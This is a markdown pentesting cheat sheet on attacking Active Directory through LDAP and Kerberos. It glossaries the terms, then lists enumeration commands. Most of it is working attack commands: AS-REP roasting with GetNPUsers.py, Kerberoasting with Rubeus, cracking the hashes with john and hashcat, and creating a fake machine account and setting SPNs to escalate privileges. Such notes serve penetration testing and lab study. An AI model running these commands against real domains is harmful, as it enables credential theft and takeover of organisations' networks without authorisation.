# LDAP and Kerberos
LDAP and Kerberos Legend:

    CN = Common Name
    OU = Organisation Name
    SN = Surname
    GN = Given Name
    O = Organisation
    DC = Domain Component
    DIT = Directory Information Tree
    DN = Distinguished Name
    RDN = Relative Distinguished Name
    SPN = Service Principale Name
    TGT = Ticket Granting Ticket
    ST = Service Ticket
    KDC = Key Distribution Center
    AS = Authorization Service
    TGS = Ticket Granting Service
    AS-REP = Authorization Service Reply
    GPO = Group Policy Object

## Interesting Active Directory groups
### CN=Domain Admins
    - full control over the domain: create, modify and delete user accounts, policies and systems
    - manage Group Policy Objects



## Enumeration
Basic enumeration of contents:

    ldapsearch -h [DC_IP] -p [PORT] -x -b "dc=[DOMAIN],dc=[TLD]"

`-x` for anonmyous bind and `-b` specifies the domains

Enumerate domain structure:

    ldapsearch -x -h [DC_IP] -D "CN=user,CN=Users,DC=example,DC=com" -W -b "DC=example,DC=com"

using `windapsearch.py`:

    windapsearch.py -d domain.tld --dc-ip [DC_IP] --custom "objectClass=*"

this command dumps an enormous content of the active directory

user enumeration:

    windapsearch.py -d domain.tld --dc-ip [DC_IP] -U

## AS-REP roasting
In Kerberos `Pre-authentication` is an important securtiy feature to prevent replay attacks and password brute force. However for some accounts pre-authentication may be disabled. This weakness can be exploited with as-rep roasting. Kerberos sends a response including encrypted information that can be used for offline cracking. If pre-authentication is enabled Kerberos sends a chellange to the user which has to be send back encrypted using the users password. This step is skipped when pre-authentication is disabled.

GetNPusers.py can be used to request such a response for a such a user:

    GetNPUsers.py domain.tld/username -dc-ip [DC_IP] -no-pass

The received hash can be passed to john for offline cracking:

    john hash --fork=4 --wordlist=/usr/share/wordlists/rockyou.txt


## Privilege Escalation
### Active shell connection
Collect ldap user information:

    whoami /all
    whoami /groups
    net user [USERNAME] /domain
    net group "Domain Admins" /domain

#### If powershell is present
Basic directory information:

    Get-ADDomain
    Get-ADUser -Identity $env:USERNAME -Properties *
    Get-ADGroup -Filter * | Select Name
    Get-ADGroupMember "Domain Admins"

Check if current user can modify interesting attributes to escalate privileges:

    (Get-ACL "LDAP://CN=Users,DC=example,DC=com").Access

Check if current user has admin privileges

    Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount

Abuse MachineAccountQuota

    New-ADComputer -Name "FakePC1" -SAMAccountName "FakePC1$" -InstancePath "OU=Computers,DC=example,DC=com"

### Abuse user privilages
Check for accounts that have `TRUSTED_FOR_DELEGATION` enabled:

    Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

#### GenericAll
GenericAll privilege can be abused for resource based constraint delegation attack (RBCD)

### Kerberoasting
If servicePrincipalName (SPN) is set on an account a Kerberos ticket can be requested and used for offline cracking.
This indicates a user can request a ST from the KDC in order to access a service. This ticket is encrypted using the users password therefore this information can be used for offline cracking.

Check for kerberoastable Accounts:

    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Set an SPN and perform Kerberoasting

    Set-ADComputer -Identity "FakePC1$" -ServicePrincipalNames @{Add="FakePC1/Service"}

Request TGS Hashes for offline Cracking:

    Rubeus.exe kerberoast /format:hashcat

Crack the hash with:

    hashcat -m 13100 hash.txt rockyou.txt